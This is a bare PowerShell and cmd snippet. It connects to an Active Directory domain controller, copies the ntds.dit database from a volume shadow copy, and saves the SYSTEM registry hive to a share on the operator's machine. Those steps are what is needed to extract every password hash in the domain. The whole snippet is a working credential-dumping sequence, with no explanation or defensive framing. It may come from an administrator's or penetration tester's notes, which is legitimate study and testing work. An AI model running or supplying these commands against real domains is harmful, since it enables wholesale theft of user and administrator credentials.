$dc=(Get-ADDomainController).hostname;$pc=$env:computername;
New-PSSession -ComputerName $DC -Credential (get-credential) | Enter-PSSession
& cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\$pc\c$\steve\ntds\ntds.dit"
reg save HKLM\SYSTEM \\$pc\c$\steve\ntds\SYS